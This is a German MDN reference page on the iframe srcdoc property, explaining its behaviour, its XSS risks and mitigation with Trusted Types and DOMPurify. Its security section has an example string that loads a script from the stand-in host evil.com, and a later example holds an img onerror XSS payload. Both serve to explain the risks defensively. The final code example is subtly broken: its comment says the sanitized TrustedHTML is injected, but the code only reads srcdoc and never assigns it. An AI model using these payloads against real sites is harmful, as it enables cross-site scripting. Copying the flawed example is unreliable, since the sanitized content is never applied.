---
title: "HTMLIFrameElement: srcdoc-Eigenschaft"
short-title: srcdoc
slug: Web/API/HTMLIFrameElement/srcdoc
l10n:
  sourceCommit: 41a472e5bad6c6d2698d6e85c1172909cb102fa1
---

{{APIRef("HTML DOM")}}

> [!WARNING]
> Diese Eigenschaft analysiert ihre Eingabe als HTML und schreibt das Ergebnis in das DOM des Frames.
> APIs wie diese gelten als [Injection Sinks](/de/docs/Web/API/Trusted_Types_API#concepts_and_usage) und können für [Cross-Site-Scripting-Angriffe (XSS)](/de/docs/Web/Security/Attacks/XSS) ausgenutzt werden, wenn die Eingabe ursprünglich von einem Angreifer stammt.
>
> Sie können dieses Risiko verringern, indem Sie stets `TrustedHTML`-Objekte statt Zeichenfolgen zuweisen und die [Verwendung von Trusted Types erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).
> Weitere Informationen finden Sie unter [Sicherheitsaspekte](#sicherheitsaspekte).

Die Eigenschaft **`srcdoc`** der Schnittstelle [`HTMLIFrameElement`](/de/docs/Web/API/HTMLIFrameElement) gibt das Inline-HTML-Markup des Frame-Dokuments zurück oder legt es fest.

Sie spiegelt das Attribut [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc) von {{htmlelement("iframe")}} wider.

## Wert

Beim Lesen der Eigenschaft wird eine Zeichenfolge mit der HTML-Serialisierung des Frame-Dokuments zurückgegeben.
Ist kein Wert festgelegt, lautet der Rückgabewert `undefined`.

Beim Setzen der Eigenschaft wird entweder ein [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekt oder eine Zeichenfolge akzeptiert.
Die Eingabe wird als HTML-Dokument analysiert; das Ergebnis ersetzt den Inhalt des Frames.

### Ausnahmen

- {{jsxref("TypeError")}}
  - : Wird ausgelöst, wenn der Eigenschaft eine Zeichenfolge zugewiesen wird, obwohl [Trusted Types](/de/docs/Web/API/Trusted_Types_API) [durch eine CSP erzwungen werden](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types) und keine Standardrichtlinie definiert ist.

## Beschreibung

Die Eigenschaft **`srcdoc`** spiegelt den Inhalt des Attributs [`srcdoc`](/de/docs/Web/HTML/Reference/Elements/iframe#srcdoc) des `<iframe>`-Elements wider. Mit ihr lässt sich das HTML-Dokument, das zum {{htmlelement("iframe")}} gehört, festlegen oder abrufen.

Beim Setzen der Eigenschaft sollte die Eingabe ein gültiges HTML-Dokument einschließlich der {{Glossary("doctype", "Doctype-Direktive")}}, {{htmlelement("html")}}, {{htmlelement("body")}} und weiterer Tags definieren.
Browser tolerieren jedoch üblicherweise ungültiges Markup und versuchen in den meisten Fällen auch dann, die Eingabe darzustellen, wenn sie nur den Inhalt des Body enthält.

Jedes vom Browser unterstützte Markup wird analysiert und serialisiert, einschließlich {{Glossary("shadow_tree", "Shadow Roots")}}.

Beachten Sie, dass ein gesetzter Wert jeden Wert überschreibt, der in der Eigenschaft [`src`](/de/docs/Web/API/HTMLIFrameElement/src) festgelegt wurde.

### Sicherheitsaspekte

Die Eigenschaft `srcdoc` erlaubt standardmäßig, beliebiges HTML-Markup in einem Frame auszuführen.
Wenn der Frame nicht mit der [`sandbox`-Direktive](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox) der Content Security Policy (CSP) isoliert wird – oder wenn die Isolierung den Wert [`allow-same-origin`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/sandbox#allow-same-origin) einschließt –, hat er denselben Ursprung wie das übergeordnete Dokument.
Das bedeutet, dass der Frame uneingeschränkten Zugriff auf das übergeordnete DOM und dessen Ressourcen hat und umgekehrt.

Dies birgt ein erhebliches Risiko für [Cross-Site-Scripting-Angriffe (XSS)](/de/docs/Web/Security/Attacks/XSS), wenn potenziell unsichere Zeichenfolgen von Benutzern ohne vorherige Bereinigung in einen Frame eingefügt werden.
Betrachten Sie den folgenden Code, bei dem eine HTML-Zeichenfolge eines Benutzers an einen Frame übergeben werden könnte, der anschließend dem Dokument hinzugefügt wird.

```js
const untrustedStringFromUser = `<!doctype html><script src="http://evil.com/naughty.js"></script>`;
const iframe = document.createElement("iframe");
iframe.srcdoc = untrustedStringFromUser;
document.body.appendChild(iframe);
```

Wenn der Frame keinen Zugriff auf das übergeordnete Dokument benötigt, können Sie das Risiko durch eine CSP-Sandbox ohne den Wert `allow-same-origin` verringern.
Der Frame wird dann als Ressource eines anderen Ursprungs behandelt, wodurch Angriffe erheblich eingeschränkt werden.
Sie können außerdem eine allgemeinere CSP verwenden, um einzuschränken, von welchen Orten Skripte und andere Ressourcen geladen werden dürfen.

Sie können das Risiko weiter verringern, indem Sie stets [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Objekte statt Zeichenfolgen zuweisen und [Trusted Types mithilfe einer CSP erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types). Verwenden Sie dazu die CSP-Direktive [`require-trusted-types-for`](/de/docs/Web/HTTP/Reference/Headers/Content-Security-Policy/require-trusted-types-for).
Dadurch wird sichergestellt, dass die Eingabe eine Transformationsfunktion durchläuft, die potenziell gefährliches Markup vor dem Einfügen durch [Bereinigung](/de/docs/Web/Security/Attacks/XSS#sanitization) entfernen kann.

## Beispiele

### HTML aus einem iframe lesen

Beim Lesen von `srcdoc` serialisiert der Browser das Dokument des iframe.

Gegeben sei das folgende HTML:

```html
<iframe
  id="example"
  srcdoc="<!doctype html><body><p>Hello World!</p></body>"></iframe>
```

Sie können das Markup wie gezeigt abrufen und protokollieren:

```js
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
console.log(frameDoc); // "<!doctype html><body><p>Hello World!</p></body>"
```

### Das Inline-Dokument des Frames ersetzen

In diesem Beispiel ersetzen wir das Dokument eines Frames, indem wir seiner Eigenschaft `srcdoc` HTML zuweisen.
Um das XSS-Risiko zu verringern, erstellen wir zunächst aus der Zeichenfolge mit dem HTML ein `TrustedHTML`-Objekt und weisen dieses Objekt anschließend `srcdoc` zu.

Trusted Types werden noch nicht von allen Browsern unterstützt. Daher definieren wir zunächst den [Trusted Types Tinyfill](/de/docs/Web/API/Trusted_Types_API#trusted_types_tinyfill).
Er dient als transparenter Ersatz für die JavaScript-API Trusted Types:

```js
if (typeof trustedTypes === "undefined")
  trustedTypes = { createPolicy: (n, rules) => rules };
```

Als Nächstes erstellen wir eine [`TrustedTypePolicy`](/de/docs/Web/API/TrustedTypePolicy), die eine [`createHTML()`](/de/docs/Web/API/TrustedTypePolicy/createHTML)-Methode definiert, um eine Eingabezeichenfolge in [`TrustedHTML`](/de/docs/Web/API/TrustedHTML)-Instanzen umzuwandeln.
Implementierungen von `createHTML()` verwenden häufig eine Bibliothek wie [DOMPurify](https://github.com/cure53/DOMPurify), um die Eingabe zu bereinigen, wie im Folgenden gezeigt:

```js
const policy = trustedTypes.createPolicy("my-policy", {
  createHTML: (input) => DOMPurify.sanitize(input),
});
```

Anschließend verwenden wir dieses `policy`-Objekt, um aus der potenziell unsicheren Eingabezeichenfolge ein `TrustedHTML`-Objekt zu erstellen, und weisen das Ergebnis dem Element zu:

```js
// The potentially malicious string
const untrustedString =
  "<!doctype html><body><p>I might be XSS</p><img src='x' onerror='alert(1)'></body>";

// Create a TrustedHTML instance using the policy
const trustedHTML = policy.createHTML(untrustedString);

// Inject the TrustedHTML (which contains a trusted string)
const frame = document.querySelector("#example");
const frameDoc = frame.srcdoc;
```

> [!WARNING]
> Sie können `srcdoc` zwar direkt eine Zeichenfolge zuweisen, doch dies birgt ein [Sicherheitsrisiko](#sicherheitsaspekte), wenn die einzufügende Zeichenfolge potenziell schädliche Inhalte enthalten könnte.
> Verwenden Sie `TrustedHTML`, um sicherzustellen, dass der Inhalt vor dem Einfügen bereinigt wird, und setzen Sie einen CSP-Header, um [Trusted Types zu erzwingen](/de/docs/Web/API/Trusted_Types_API#using_a_csp_to_enforce_trusted_types).

## Spezifikationen

{{Specifications}}

## Browser-Kompatibilität

{{Compat}}
